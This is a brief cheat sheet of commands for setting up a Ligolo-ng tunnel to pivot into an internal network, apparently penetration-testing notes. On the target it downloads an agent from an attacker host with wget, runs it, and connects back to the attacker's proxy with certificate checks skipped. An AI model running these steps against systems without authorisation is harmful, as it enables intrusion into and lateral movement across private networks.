# Ligolo-ng Tunnel Setup

```bash
# attacker:
sudo ./proxy -selfcert
ifcreate --name <tun-name>
route_add --name <tun-name> --route <internal-host>/32   # one /32 per host — avoids looping your local /24 into the tunnel

# target (pivot host):
wget http://<LHOST>/agent ; chmod +x agent
./agent -connect <LHOST>:11601 --ignore-cert

# back in the proxy console:
session                 # select the joined agent session
tunnel_start --tun <tun-name>
tunnel_list ; route_list   # verify
```

